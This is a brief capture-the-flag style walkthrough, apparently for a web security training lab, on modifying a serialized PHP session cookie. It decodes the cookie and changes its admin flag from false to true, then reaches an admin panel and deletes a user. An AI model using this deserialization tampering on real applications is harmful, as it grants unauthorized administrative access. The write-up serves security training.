# Modifying serialized objects

Make request to
```http
GET /my-account
```
</br>

Edit the session cookie by decoding it in the inspector tab
`session=Tzo0OiJVc2VyIjoyOntzOjg6InVzZXJuYW1lIjtzOjY6IndpZW5lciI7czo1OiJhZG1pbiI7YjowO30%3d`

</br>

The decoded session cookie:
```php
O:4:"User":2:{s:8:"username";s:6:"wiener";s:5:"admin";b:0;}
```
</br>

Take note: the cookie is in fact a serialized PHP object. The `admin` attribute contains `b:0`, indicating the boolean value `false.` 
Change value of `admin` attribute to `b:1`, and click "apply changes"

</br>

The edited session cookie:
```php
O:4:"User":2:{s:8:"username";s:6:"wiener";s:5:"admin";b:1;}
```
</br>

Then make request to `GET /admin`
And you can delete carlos from there.
